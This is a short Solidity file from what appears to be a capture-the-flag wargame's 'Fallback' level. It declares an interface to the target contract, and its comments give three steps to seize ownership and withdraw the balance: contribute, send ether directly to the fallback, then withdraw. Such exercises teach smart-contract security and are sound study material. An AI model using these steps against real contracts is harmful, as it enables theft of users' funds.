pragma solidity ^0.8;

// Must claim ownership from wallet (player's address)
// 1. fallback.contribute{value: 1}()
// 2. address(fallback).call{value: 1}("")
// 3. fallback.withdraw

interface IFallback {
    function owner() external view returns (address);
    function contributions(address) external view returns (uint256);
    function contribute() external payable;
    function withdraw() external;
}
